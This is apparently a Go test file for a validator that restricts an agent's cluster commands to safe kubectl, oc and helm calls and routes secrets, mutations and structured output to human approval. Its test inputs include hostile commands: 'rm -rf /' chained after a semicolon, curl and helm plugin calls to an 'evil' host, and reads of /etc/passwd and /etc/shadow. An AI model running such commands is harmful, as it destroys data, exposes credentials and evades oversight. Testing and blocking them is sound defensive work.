package agent

import (
	"testing"
)

func TestValidateMixedModeCommand(t *testing.T) {
	tests := []struct {
		name             string
		command          string
		wantApproval     bool
		wantReason       string
		wantEmpty        bool // reason == "" means approved
	}{
		// Shell injection patterns
		{name: "blocks semicolons", command: "kubectl get pods; rm -rf /", wantReason: "shell chaining"},
		{name: "blocks pipe", command: "kubectl get pods | grep nginx", wantReason: "shell chaining"},
		{name: "blocks ampersand", command: "kubectl get pods & bg", wantReason: "shell chaining"},
		{name: "blocks redirect", command: "kubectl get secrets > /tmp/out", wantReason: "shell chaining"},
		{name: "blocks backtick", command: "kubectl get `cat /etc/passwd`", wantReason: "shell chaining"},
		{name: "blocks dollar sign", command: "kubectl get $SECRET", wantReason: "shell chaining"},
		{name: "blocks subshell", command: "kubectl get $(id)", wantReason: "shell chaining"},

		// Blocked commands
		{name: "blocks unknown command", command: "rm -rf /", wantReason: "only kubectl, oc, and helm"},
		{name: "blocks curl", command: "curl http://evil.com", wantReason: "only kubectl, oc, and helm"},
		{name: "blocks bash", command: "bash -c 'exploit'", wantReason: "only kubectl, oc, and helm"},

		// Streaming flags blocked
		{name: "blocks -w flag", command: "kubectl get pods -w", wantReason: "streaming or watch"},
		{name: "blocks --watch", command: "kubectl get pods --watch", wantReason: "streaming or watch"},
		{name: "blocks --follow", command: "kubectl logs pod --follow", wantReason: "streaming or watch"},
		{name: "blocks -f flag", command: "kubectl logs pod -f", wantReason: "streaming or watch"},

		// Transport overrides blocked
		{name: "blocks --kubeconfig", command: "kubectl --kubeconfig=/etc/kubernetes/admin.conf get pods", wantReason: "transport, authentication"},
		{name: "blocks --token", command: "kubectl --token=abc123 get pods", wantReason: "transport, authentication"},
		{name: "blocks --server", command: "kubectl --server=http://evil get pods", wantReason: "transport, authentication"},

		// Safe read-only kubectl
		{name: "allows kubectl get pods", command: "kubectl get pods", wantEmpty: true},
		{name: "allows kubectl get pods -n kube-system", command: "kubectl get pods -n kube-system", wantEmpty: true},
		{name: "allows kubectl describe pod", command: "kubectl describe pod nginx", wantEmpty: true},
		{name: "allows kubectl cluster-info", command: "kubectl cluster-info", wantEmpty: true},
		{name: "allows kubectl version", command: "kubectl version", wantEmpty: true},
		{name: "allows kubectl api-resources", command: "kubectl api-resources", wantEmpty: true},

		// Sensitive resources require approval
		{name: "sensitive get secrets", command: "kubectl get secrets", wantApproval: true, wantReason: "sensitive resources"},
		{name: "sensitive describe secret", command: "kubectl describe secret my-secret", wantApproval: true, wantReason: "sensitive resources"},

		// Mutation requires approval
		{name: "apply requires approval", command: "kubectl apply -f deployment.yaml", wantApproval: true},
		{name: "delete requires approval", command: "kubectl delete pod nginx", wantApproval: true},
		{name: "create requires approval", command: "kubectl create namespace test", wantApproval: true},
		{name: "scale requires approval", command: "kubectl scale deployment nginx --replicas=3", wantApproval: true},

		// Blocked kubectl flags
		{name: "blocks --raw", command: "kubectl get --raw /api/v1/pods", wantReason: "kubectl --raw"},

		// Path traversal blocked
		{name: "blocks cp path traversal", command: "kubectl cp pod:/../../etc/passwd ./out", wantReason: "path traversal"},
		{name: "blocks exec path traversal", command: "kubectl exec pod -- cat /../../etc/shadow", wantReason: "path traversal"},

		// Helm commands
		{name: "allows helm list", command: "helm list", wantEmpty: true},
		{name: "allows helm status", command: "helm status release", wantEmpty: true},
		{name: "allows helm version", command: "helm version", wantEmpty: true},
		{name: "helm install requires approval", command: "helm install release chart", wantApproval: true, wantReason: "helm install requires"},
		{name: "helm upgrade requires approval", command: "helm upgrade release chart", wantApproval: true, wantReason: "helm upgrade requires"},
		{name: "helm uninstall requires approval", command: "helm uninstall release", wantApproval: true, wantReason: "helm uninstall requires"},
		{name: "blocks helm plugin", command: "helm plugin install http://evil", wantReason: "not allowlisted"},

		// Output format sensitivity
		{name: "sensitive json output", command: "kubectl get pods -o json", wantApproval: true, wantReason: "structured output"},
		{name: "sensitive jsonpath output", command: "kubectl get pods -o jsonpath={.items}", wantApproval: true, wantReason: "structured output"},
		{name: "sensitive yaml output", command: "kubectl get pods -o yaml", wantApproval: true, wantReason: "structured output"},

		// kubectl config
		{name: "allows kubectl config view", command: "kubectl config view", wantEmpty: true},
		{name: "allows kubectl config get-contexts", command: "kubectl config get-contexts", wantEmpty: true},
		{name: "blocks kubectl config set", command: "kubectl config set-context new", wantReason: "kubectl config mutations"},
		{name: "config view --raw requires approval", command: "kubectl config view --raw", wantApproval: true, wantReason: "kubectl config view --raw"},

		// oc treated same as kubectl
		{name: "allows oc get pods", command: "oc get pods", wantEmpty: true},
		{name: "oc blocks shell injection", command: "oc get pods; whoami", wantReason: "shell chaining"},

		// Empty command
		{name: "empty command blocked", command: "", wantReason: "command is empty"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			requiresApproval, reason := validateMixedModeCommand(tt.command)

			if tt.wantEmpty {
				if reason != "" {
					t.Errorf("expected command to be approved (empty reason), got reason=%q", reason)
				}
				return
			}

			if reason == "" {
				t.Fatal("expected command to be rejected or require approval, got empty reason")
			}

			if tt.wantApproval && !requiresApproval {
				t.Errorf("expected requiresApproval=true, got false (reason=%q)", reason)
			}
			if !tt.wantApproval && tt.wantReason != "" && requiresApproval {
				t.Errorf("expected requiresApproval=false, got true (reason=%q)", reason)
			}

			if tt.wantReason != "" && !stringContainsSub(reason, tt.wantReason) {
				t.Errorf("reason = %q, want substring %q", reason, tt.wantReason)
			}
		})
	}
}

func TestValidateMixedModeCommandsBatch(t *testing.T) {
	t.Run("mixed batch separates approved and rejected", func(t *testing.T) {
		commands := []string{
			"kubectl get pods",
			"kubectl get nodes",
			"rm -rf /",
			"",
			"kubectl get secrets",
		}
		result := validateMixedModeCommands(commands)

		if len(result.Approved) != 2 {
			t.Errorf("Approved count = %d, want 2", len(result.Approved))
		}
		// "rm -rf /" rejected (not allowed command), "kubectl get secrets" requires approval (sensitive)
		if len(result.Rejected) != 2 {
			t.Errorf("Rejected count = %d, want 2 (rm blocked + secrets needs approval)", len(result.Rejected))
		}
	})

	t.Run("empty commands skipped", func(t *testing.T) {
		result := validateMixedModeCommands([]string{"", "  ", "kubectl get pods"})
		if len(result.Approved) != 1 {
			t.Errorf("Approved count = %d, want 1", len(result.Approved))
		}
		if len(result.Rejected) != 0 {
			t.Errorf("Rejected count = %d, want 0", len(result.Rejected))
		}
	})

	t.Run("all blocked returns empty approved", func(t *testing.T) {
		result := validateMixedModeCommands([]string{"curl evil.com", "bash -c exploit"})
		if len(result.Approved) != 0 {
			t.Errorf("Approved count = %d, want 0", len(result.Approved))
		}
		if len(result.Rejected) != 2 {
			t.Errorf("Rejected count = %d, want 2", len(result.Rejected))
		}
	})
}

func TestNormalizeMixedModeOutputFormat(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"json", "json"},
		{"JSON", "json"},
		{"yaml", "yaml"},
		{" yaml ", "yaml"},
		{"=yaml", "yaml"},
		{"jsonpath={.items}", "jsonpath"},
		{"jsonpath='{.metadata.name}'", "jsonpath"},
		{"go-template={{.name}}", "go-template"},
		{"go-template-file=/tmp/t.tmpl", "go-template"},
		{"custom-columns=NAME:.metadata.name", "custom-columns"},
		{"wide", "wide"},
		{"name", "name"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := normalizeMixedModeOutputFormat(tt.input)
			if got != tt.want {
				t.Errorf("normalizeMixedModeOutputFormat(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestHasMixedModePathTraversalSegment(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"normal/path/file.txt", false},
		{"../etc/passwd", true},
		{"/tmp/../etc/shadow", true},
		{"./current/dir", false},
		{"..\\windows\\system32", true},
		{"", false},
		{"just-a-filename", false},
		{"/absolute/path", false},
		{"nested/../../escape", true},
	}

	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			got := hasMixedModePathTraversalSegment(tt.value)
			if got != tt.want {
				t.Errorf("hasMixedModePathTraversalSegment(%q) = %v, want %v", tt.value, got, tt.want)
			}
		})
	}
}

func TestMixedModeTraversalTarget(t *testing.T) {
	tests := []struct {
		arg  string
		want string
	}{
		{"pod:/tmp/file.txt", "/tmp/file.txt"},
		{"pod:../../etc/passwd", "../../etc/passwd"},
		{"no-colon-arg", "no-colon-arg"},
		{"namespace/pod:/data/file", "/data/file"},
		{":", ""},
	}

	for _, tt := range tests {
		t.Run(tt.arg, func(t *testing.T) {
			got := mixedModeTraversalTarget(tt.arg)
			if got != tt.want {
				t.Errorf("mixedModeTraversalTarget(%q) = %q, want %q", tt.arg, got, tt.want)
			}
		})
	}
}

func TestHasMixedModeStreamingFlag(t *testing.T) {
	tests := []struct {
		name string
		args []string
		want bool
	}{
		{"no flags", []string{"get", "pods"}, false},
		{"-w flag", []string{"get", "pods", "-w"}, true},
		{"--watch flag", []string{"get", "pods", "--watch"}, true},
		{"--watch-only", []string{"get", "pods", "--watch-only"}, true},
		{"--follow flag", []string{"logs", "pod", "--follow"}, true},
		{"-f flag", []string{"logs", "pod", "-f"}, true},
		{"--follow=true", []string{"logs", "pod", "--follow=true"}, true},
		{"unrelated -n flag", []string{"get", "pods", "-n", "default"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := hasMixedModeStreamingFlag(tt.args)
			if got != tt.want {
				t.Errorf("hasMixedModeStreamingFlag(%v) = %v, want %v", tt.args, got, tt.want)
			}
		})
	}
}

func TestTouchesMixedModeSensitiveKubectlResource(t *testing.T) {
	tests := []struct {
		name string
		args []string
		want bool
	}{
		{"get pods not sensitive", []string{"get", "pods"}, false},
		{"get secrets is sensitive", []string{"get", "secrets"}, true},
		{"get secret singular", []string{"get", "secret"}, true},
		{"describe secret", []string{"describe", "secret", "my-secret"}, true},
		{"get configmaps not sensitive", []string{"get", "configmaps"}, false},
		{"non-read verb ignored", []string{"delete", "secret", "x"}, false},
		{"comma-separated with secret", []string{"get", "pods,secrets"}, true},
		{"empty args", []string{}, false},
		{"get with namespace", []string{"get", "pods", "-n", "kube-system"}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := touchesMixedModeSensitiveKubectlResource(tt.args)
			if got != tt.want {
				t.Errorf("touchesMixedModeSensitiveKubectlResource(%v) = %v, want %v", tt.args, got, tt.want)
			}
		})
	}
}

// stringContainsSub checks if s contains substr.
func stringContainsSub(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
